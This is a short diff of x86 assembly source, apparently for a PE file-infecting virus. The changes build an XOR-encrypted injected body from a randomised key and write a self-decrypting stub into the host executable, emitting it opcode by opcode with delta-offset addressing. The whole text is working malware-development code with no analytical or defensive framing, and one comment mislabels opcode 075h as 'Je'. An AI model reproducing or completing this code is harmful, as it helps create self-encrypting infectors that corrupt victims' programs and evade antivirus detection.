@@ -493,34 +493,34 @@ sub	eax, [DELTA VirtualAddress]
 mov	esi, errorExit - toInject
 sub	eax, esi
 sub	eax, 05h ; Add 5 bytes for JMP
-xor	eax, edx ; Encrypt
+; Set same byte for all 4 bytes of EDX
+push	edx
+rol	edx, 4
+mov	dl, dh
+rol	edx, 4
+mov	dl, dh
+rol	edx, 4
+mov	dl, dh
+xor	eax, edx
+pop	edx
 stosd
 
 ; CREATING DECRYPTER
-; TODO loop on all and xoring with the rand used in the encrypter
-; mov edi, eip + decrypterSize
-; mov esi, edi
-; xor ecx, ecx
-; |> lodsb
-; |  xor eax, edxRandom
-; |  stosb
-; |  inc ecx
-; |  cmp ecx, errorExit - toInject - decrypterSize
-; |< Je
 mov	edi, [DELTA PeFileMap]
 add	edi, [DELTA PointerToRawData]
 mov	eax, 0BFh ; Mov edi
 stosb
-mov	eax, 0400000h ; TODO - Get BA
+mov	eax, 25 ; Decrypter Size
+add	eax, 0400000h ; TODO - Get BA
 add	eax, [DELTA VirtualAddress]
 stosd
 mov	eax, 0F78Bh ; mov esi, edi
 stosw
 mov	eax, 0C933h ; xor ecx, ecx
 stosw
-mov	eax, 0ACh ; lodsb
+mov	eax, 0ACh ; lodsb opcode
 stosb
-mov	eax, 035h ; xor
+mov	eax, 035h ; xor opcode
 stosb
 mov	eax, edx ; random xor
 stosd
@@ -530,11 +530,11 @@ mov	eax, 041h ; inc ecx
 stosb
 mov	eax, 0F981h ; cmp ecx
 stosw
-mov	eax, errorExit - toInject - 27
+mov	eax, endInject - toInject - 25
 stosd
-mov	eax, 074h ; Je
+mov	eax, 075h ; Je
 stosb
-mov	eax, toInject - endDecrypter
+mov	eax, -25 + 9
 stosb
 
 
